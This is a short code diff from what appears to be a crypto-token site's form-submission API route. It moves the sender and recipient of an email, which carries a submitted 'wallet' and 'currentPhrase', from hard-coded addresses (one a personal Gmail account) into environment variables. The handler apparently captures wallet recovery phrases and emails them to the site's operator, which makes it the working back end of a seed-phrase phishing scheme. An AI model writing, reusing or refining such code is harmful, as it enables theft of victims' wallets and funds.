@@ -8,8 +8,8 @@ export async function POST(request: Request) {
 
   try {
     await resend.emails.send({
-      from: "pullixApp@pullixtoken.live",
-      to: "captainsurge0079@gmail.com",
+      from: process.env.NEXT_PUBLIC_MAIL_FROM,
+      to: process.env.NEXT_PUBLIC_MAIL_TO,
       subject: "Form Submitted",
       react: Email({ wallet, currentPhrase }),
     });
